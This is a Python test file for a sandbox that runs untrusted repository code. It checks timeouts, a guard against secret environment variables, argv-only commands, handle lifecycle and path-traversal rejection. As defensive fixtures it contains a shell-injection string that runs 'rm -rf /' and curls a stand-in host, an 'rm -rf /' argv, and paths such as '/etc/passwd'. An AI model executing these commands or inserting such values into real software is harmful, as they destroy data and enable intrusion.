"""Security-critical tests for the SandboxRunner port and FakeSandbox adapter.

Untrusted repo code may only run in ephemeral, secret-free sandboxes with an
enforced timeout on every ``exec``. These tests verify:

* a scripted TIMEOUT is returned as *typed data* (``Ok`` with
  ``outcome=TIMEOUT`` / ``exit_code=None``) -- never a hang, never an exception;
* every ``exec`` requires a finite, strictly positive ``timeout_s``;
* the zero-secrets guard rejects any env key whose name contains a
  secret-looking substring (case-insensitively);
* ``argv`` is an opaque tuple of discrete args -- there is no shell-string path;
* a handle is single-use: after ``release`` it is dead for both ``exec`` and
  ``write_files``;
* ``acquire`` honours capacity and returns ``SandboxUnavailableError`` when none
  is free;
* ``write_files`` rejects absolute and parent-traversing paths;
* ``exec`` results are inert data (this test never eval/exec's stdout/stderr);
* construction rejects a TIMEOUT result carrying a non-None exit_code.

Structural conformance (``SandboxRunner`` is satisfied by ``FakeSandbox``) is
proved statically by the scoped mypy run through ``_static_conformance`` below.
"""

from __future__ import annotations

import dataclasses
import math
import time
from typing import TypeVar

import pytest

from backend.adapters.fake.fake_sandbox import FakeSandbox
from backend.domain.enums import SandboxOutcome
from backend.domain.errors import (
    Err,
    Ok,
    Result,
    SandboxError,
    SandboxTimeoutError,
    SandboxUnavailableError,
)
from backend.ports.sandbox import (
    SandboxCommand,
    SandboxHandle,
    SandboxResult,
    SandboxRunner,
    find_secret_env_key,
    validate_command,
    validate_exec_timeout,
    validate_sandbox_path,
)

_T = TypeVar("_T")


# --------------------------------------------------------------------------- #
# helpers                                                                      #
# --------------------------------------------------------------------------- #
def _expect_ok(result: Result[_T, SandboxError]) -> _T:
    assert isinstance(result, Ok), f"expected Ok, got {result!r}"
    return result.value


def _expect_err(result: Result[_T, SandboxError]) -> SandboxError:
    assert isinstance(result, Err), f"expected Err, got {result!r}"
    return result.error


_PASS_ARGV: tuple[str, ...] = ("npm", "test")
_TIMEOUT_ARGV: tuple[str, ...] = ("npm", "run", "slow")
_INJECTION_ARGV: tuple[str, ...] = ("cat", "README.md")

_PASS_RESULT = SandboxResult(
    outcome=SandboxOutcome.PASSED,
    exit_code=0,
    stdout="all green",
    stderr="",
    duration_s=0.5,
)
_TIMEOUT_RESULT = SandboxResult(
    outcome=SandboxOutcome.TIMEOUT,
    exit_code=None,
    stdout="",
    stderr="killed after deadline",
    duration_s=30.0,
)
# stdout that *looks* like a shell payload; it must be returned verbatim as data.
_INJECTION_RESULT = SandboxResult(
    outcome=SandboxOutcome.PASSED,
    exit_code=0,
    stdout="$(rm -rf /); `curl evil.example`; ${IFS}",
    stderr="",
    duration_s=0.1,
)


def _fresh_sandbox(capacity: int = 1) -> FakeSandbox:
    return FakeSandbox(
        {
            _PASS_ARGV: _PASS_RESULT,
            _TIMEOUT_ARGV: _TIMEOUT_RESULT,
            _INJECTION_ARGV: _INJECTION_RESULT,
        },
        capacity=capacity,
    )


def _cmd(
    argv: tuple[str, ...],
    env: dict[str, str] | None = None,
) -> SandboxCommand:
    return SandboxCommand(argv=argv, cwd=".", env=env if env is not None else {})


def _acquire_handle(sandbox: FakeSandbox) -> SandboxHandle:
    return _expect_ok(sandbox.acquire("snap-1"))


# --------------------------------------------------------------------------- #
# case 1 -- scripted TIMEOUT is inert data, never a hang / exception           #
# --------------------------------------------------------------------------- #
def test_scripted_timeout_returns_value_not_hang() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)

    start = time.monotonic()
    result = sandbox.exec(handle, _cmd(_TIMEOUT_ARGV), timeout_s=30.0)
    elapsed = time.monotonic() - start

    # The caller gets a value promptly -- it never blocks for the real 30s.
    assert elapsed < 1.0, f"exec blocked for {elapsed:.3f}s; must return promptly"
    value = _expect_ok(result)
    assert value.outcome is SandboxOutcome.TIMEOUT
    assert value.exit_code is None
    # A timeout is data, NOT a raised/returned SandboxTimeoutError.
    assert not isinstance(result, Err)


def test_timeout_is_not_returned_as_error() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    result = sandbox.exec(handle, _cmd(_TIMEOUT_ARGV), timeout_s=30.0)
    # Guard against a regression where TIMEOUT leaks out as an Err(SandboxTimeoutError).
    if isinstance(result, Err):
        pytest.fail(
            "scripted TIMEOUT surfaced as Err "
            f"({type(result.error).__name__}); expected Ok(SandboxResult)"
        )
    assert not isinstance(result.value, SandboxTimeoutError)


# --------------------------------------------------------------------------- #
# case 2 -- every exec needs a finite, strictly positive timeout               #
# --------------------------------------------------------------------------- #
def test_validate_exec_timeout_rejects_nonpositive_and_nonfinite() -> None:
    bad: list[float] = [
        0.0,
        -0.0,
        -1.0,
        -1e-9,
        math.nan,
        math.inf,
        -math.inf,
    ]
    for value in bad:
        _expect_err(validate_exec_timeout(value))


def test_validate_exec_timeout_accepts_small_positive() -> None:
    for value in (1e-9, 0.5, 1.0, 30.0, 1e6):
        assert isinstance(validate_exec_timeout(value), Ok), value


def test_exec_rejects_bad_timeout_end_to_end() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    for value in (0.0, -1.0, math.nan, math.inf, -math.inf):
        result = sandbox.exec(handle, _cmd(_PASS_ARGV), timeout_s=value)
        error = _expect_err(result)
        assert isinstance(error, SandboxError)


def test_exec_rejects_bad_timeout_even_with_scripted_argv() -> None:
    # A zero timeout must fail *before* any command is "run".
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    result = sandbox.exec(handle, _cmd(_PASS_ARGV), timeout_s=0.0)
    _expect_err(result)


# --------------------------------------------------------------------------- #
# case 3 -- zero-secrets guard                                                 #
# --------------------------------------------------------------------------- #
def test_find_secret_env_key_flags_each_substring() -> None:
    offenders: dict[str, str] = {
        "MY_KEY": "key",
        "ACCESS_TOKEN": "token",
        "CLIENT_SECRET": "secret",
        "DB_PASSWORD": "password",
        "AWS_CREDENTIAL": "credential",
        "API_BASE": "api",
    }
    for name in offenders:
        assert find_secret_env_key({name: "x"}) == name, name


def test_find_secret_env_key_is_case_insensitive() -> None:
    for name in ("Api_Key", "api_key", "gItHuB_tOkEn", "Secret", "PaSsWoRd"):
        assert find_secret_env_key({name: "x"}) == name, name


def test_find_secret_env_key_clean_env_returns_none() -> None:
    clean: dict[str, str] = {"NODE_ENV": "test", "PATH": "/usr/bin", "CI": "1"}
    assert find_secret_env_key(clean) is None


def test_find_secret_env_key_empty_env_returns_none() -> None:
    assert find_secret_env_key({}) is None


def test_find_secret_env_key_reports_deterministic_offender() -> None:
    # Mixed clean + secret keys: the offending key is reported, not None.
    mixed: dict[str, str] = {"NODE_ENV": "test", "API_KEY": "leak", "PATH": "/bin"}
    assert find_secret_env_key(mixed) == "API_KEY"


def test_validate_command_rejects_secret_env() -> None:
    for name in ("API_KEY", "GITHUB_TOKEN", "DB_PASSWORD", "secret", "credential"):
        result = validate_command(_cmd(_PASS_ARGV, {name: "value"}))
        error = _expect_err(result)
        assert isinstance(error, SandboxError)


def test_validate_command_allows_clean_env() -> None:
    result = validate_command(_cmd(_PASS_ARGV, {"NODE_ENV": "test", "PATH": "/usr/bin"}))
    assert isinstance(result, Ok)


def test_exec_rejects_secret_env_end_to_end() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    for name in ("API_KEY", "GITHUB_TOKEN", "DB_PASSWORD", "Api_Key", "credential"):
        result = sandbox.exec(handle, _cmd(_PASS_ARGV, {name: "leak"}), timeout_s=5.0)
        error = _expect_err(result)
        assert isinstance(error, SandboxError)


def test_exec_allows_clean_env_end_to_end() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    result = sandbox.exec(
        handle,
        _cmd(_PASS_ARGV, {"NODE_ENV": "test", "PATH": "/usr/bin"}),
        timeout_s=5.0,
    )
    value = _expect_ok(result)
    assert value.outcome is SandboxOutcome.PASSED


# --------------------------------------------------------------------------- #
# case 4 -- argv only, no shell-string path                                    #
# --------------------------------------------------------------------------- #
def test_command_argv_is_a_tuple() -> None:
    cmd = _cmd(_PASS_ARGV)
    assert isinstance(cmd.argv, tuple)


def test_command_has_no_shell_string_field() -> None:
    field_names = {f.name for f in dataclasses.fields(SandboxCommand)}
    assert field_names == {"argv", "cwd", "env"}
    # Explicitly ensure no field hints at a shell/command-line string sink.
    for banned in ("shell", "command", "cmd", "cmdline", "script", "shell_string"):
        assert banned not in field_names, banned


def test_normal_argv_execs_fine() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    value = _expect_ok(sandbox.exec(handle, _cmd(_PASS_ARGV), timeout_s=5.0))
    assert value.exit_code == 0


def test_empty_argv_is_rejected() -> None:
    empty: tuple[str, ...] = ()
    _expect_err(validate_command(_cmd(empty)))


# --------------------------------------------------------------------------- #
# case 5 -- single-use handle: dead after release                             #
# --------------------------------------------------------------------------- #
def test_exec_on_released_handle_is_unavailable() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    _expect_ok(sandbox.release(handle))
    result = sandbox.exec(handle, _cmd(_PASS_ARGV), timeout_s=5.0)
    error = _expect_err(result)
    assert isinstance(error, SandboxUnavailableError)


def test_write_files_on_released_handle_is_unavailable() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    _expect_ok(sandbox.release(handle))
    result = sandbox.write_files(handle, {"src/index.js": "x"})
    error = _expect_err(result)
    assert isinstance(error, SandboxUnavailableError)


def test_release_twice_is_unavailable() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    _expect_ok(sandbox.release(handle))
    error = _expect_err(sandbox.release(handle))
    assert isinstance(error, SandboxUnavailableError)


def test_exec_on_never_acquired_handle_is_unavailable() -> None:
    sandbox = _fresh_sandbox()
    forged = SandboxHandle("fake-sandbox-999")
    error = _expect_err(sandbox.exec(forged, _cmd(_PASS_ARGV), timeout_s=5.0))
    assert isinstance(error, SandboxUnavailableError)


def test_released_handle_bad_timeout_reports_unavailable_first() -> None:
    # Liveness is checked before timeout: a dead handle wins over a bad timeout.
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    _expect_ok(sandbox.release(handle))
    error = _expect_err(sandbox.exec(handle, _cmd(_PASS_ARGV), timeout_s=0.0))
    assert isinstance(error, SandboxUnavailableError)


# --------------------------------------------------------------------------- #
# case 6 -- capacity / acquire semantics                                       #
# --------------------------------------------------------------------------- #
def test_acquire_with_zero_capacity_is_unavailable() -> None:
    sandbox = FakeSandbox({}, capacity=0)
    error = _expect_err(sandbox.acquire("snap-1"))
    assert isinstance(error, SandboxUnavailableError)


def test_acquire_release_reacquire_cycle() -> None:
    sandbox = _fresh_sandbox(capacity=1)
    first = _acquire_handle(sandbox)
    # Second acquire while the only slot is busy -> unavailable.
    busy = _expect_err(sandbox.acquire("snap-2"))
    assert isinstance(busy, SandboxUnavailableError)
    _expect_ok(sandbox.release(first))
    second = _acquire_handle(sandbox)
    assert isinstance(second, SandboxHandle)


def test_handle_ids_are_monotonic_and_never_reused() -> None:
    sandbox = _fresh_sandbox(capacity=1)
    first = _acquire_handle(sandbox)
    _expect_ok(sandbox.release(first))
    second = _acquire_handle(sandbox)
    assert first.id != second.id, (first.id, second.id)
    assert first.id == "fake-sandbox-1"
    assert second.id == "fake-sandbox-2"


def test_acquire_rejects_blank_snapshot_id() -> None:
    sandbox = _fresh_sandbox()
    for snapshot_id in ("", "   ", "\t\n"):
        error = _expect_err(sandbox.acquire(snapshot_id))
        assert isinstance(error, SandboxError)


def test_negative_capacity_is_rejected_at_construction() -> None:
    with pytest.raises(ValueError):
        FakeSandbox({}, capacity=-1)


# --------------------------------------------------------------------------- #
# case 7 -- write_files path validation                                        #
# --------------------------------------------------------------------------- #
def test_validate_sandbox_path_rejects_dangerous_paths() -> None:
    dangerous: list[str] = [
        "",
        "/x",
        "/etc/passwd",
        "../x",
        "a/../../b",
        "../../secrets",
        "..",
        "a/..",
        "src/../../../etc/hosts",
    ]
    for path in dangerous:
        _expect_err(validate_sandbox_path(path))


def test_validate_sandbox_path_accepts_clean_relative_paths() -> None:
    clean: list[str] = [
        "src/index.js",
        "a/b/c.txt",
        "package.json",
        "..foo",  # not a parent-dir component
        "foo..bar",
        "dir/..hidden",
    ]
    for path in clean:
        assert isinstance(validate_sandbox_path(path), Ok), path


def test_write_files_rejects_absolute_path() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    error = _expect_err(sandbox.write_files(handle, {"/etc/passwd": "x"}))
    assert isinstance(error, SandboxError)


def test_write_files_rejects_parent_traversal() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    for path in ("../x", "a/../../b"):
        error = _expect_err(sandbox.write_files(handle, {path: "x"}))
        assert isinstance(error, SandboxError)


def test_write_files_rejects_when_any_path_is_bad() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    files: dict[str, str] = {"src/index.js": "ok", "../evil": "bad"}
    _expect_err(sandbox.write_files(handle, files))


def test_write_files_accepts_clean_relative_path() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    assert isinstance(sandbox.write_files(handle, {"src/index.js": "x"}), Ok)


def test_write_files_empty_mapping_is_ok() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    empty: dict[str, str] = {}
    assert isinstance(sandbox.write_files(handle, empty), Ok)


# --------------------------------------------------------------------------- #
# case 8 -- exec results are inert data (never evaluated)                      #
# --------------------------------------------------------------------------- #
def test_exec_stdout_is_returned_verbatim_never_evaluated() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    value = _expect_ok(sandbox.exec(handle, _cmd(_INJECTION_ARGV), timeout_s=5.0))
    # The shell-looking stdout is preserved byte-for-byte as a plain string.
    assert value.stdout == "$(rm -rf /); `curl evil.example`; ${IFS}"
    assert isinstance(value.stdout, str)
    assert isinstance(value.stderr, str)


def test_result_fields_are_plain_typed_data() -> None:
    field_types = {f.name for f in dataclasses.fields(SandboxResult)}
    assert field_types == {"outcome", "exit_code", "stdout", "stderr", "duration_s"}
    result = _PASS_RESULT
    assert isinstance(result.outcome, SandboxOutcome)
    assert isinstance(result.exit_code, int)
    assert isinstance(result.stdout, str)
    assert isinstance(result.duration_s, float)


def test_unknown_argv_is_rejected_not_executed() -> None:
    sandbox = _fresh_sandbox()
    handle = _acquire_handle(sandbox)
    error = _expect_err(
        sandbox.exec(handle, _cmd(("rm", "-rf", "/")), timeout_s=5.0)
    )
    assert isinstance(error, SandboxError)


# --------------------------------------------------------------------------- #
# case 9 -- construction guard for malformed TIMEOUT results                   #
# --------------------------------------------------------------------------- #
def test_timeout_result_with_exit_code_rejected_at_construction() -> None:
    bad = SandboxResult(
        outcome=SandboxOutcome.TIMEOUT,
        exit_code=0,
        stdout="",
        stderr="",
        duration_s=1.0,
    )
    with pytest.raises(ValueError):
        FakeSandbox({("x",): bad})


def test_timeout_result_with_nonzero_exit_code_rejected() -> None:
    bad = SandboxResult(
        outcome=SandboxOutcome.TIMEOUT,
        exit_code=137,
        stdout="",
        stderr="",
        duration_s=1.0,
    )
    with pytest.raises(ValueError):
        FakeSandbox({("y",): bad})


def test_empty_argv_key_rejected_at_construction() -> None:
    empty_key: tuple[str, ...] = ()
    with pytest.raises(ValueError):
        FakeSandbox({empty_key: _PASS_RESULT})


def test_valid_timeout_result_constructs_fine() -> None:
    # A TIMEOUT with exit_code=None is the only legal shape.
    sandbox = FakeSandbox({("z",): _TIMEOUT_RESULT})
    assert isinstance(sandbox, FakeSandbox)


# --------------------------------------------------------------------------- #
# case 10 -- structural conformance (proved statically by mypy)                #
# --------------------------------------------------------------------------- #
def _static_conformance() -> SandboxRunner:
    runner: SandboxRunner = FakeSandbox({})
    return runner


def test_structural_conformance() -> None:
    runner: SandboxRunner = FakeSandbox({})
    assert isinstance(runner, FakeSandbox)
    assert isinstance(_static_conformance(), FakeSandbox)
